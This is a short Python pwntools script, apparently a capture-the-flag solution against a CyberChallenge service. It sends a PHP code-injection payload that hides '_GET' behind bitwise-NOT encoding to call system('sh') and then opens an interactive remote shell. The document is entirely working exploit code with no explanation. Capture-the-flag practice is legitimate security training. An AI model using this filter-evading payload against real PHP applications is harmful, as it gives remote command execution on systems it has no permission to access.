from pwn import *

url = 'cyberchallenge.disi.unitn.it'
r = remote(url, 7401)

get = ''.join(chr(~ord(c) & 0xFF) for c in '_GET')


payload = "/?code=${~" + get + "}{0}('sh')" + '&0=system'


r.sendline('GET ' + payload + ' HTTP/1.1')
r.sendline('Host: cyberchallenge.disi.unitn.it:7401')
r.sendline()

r.interactive()


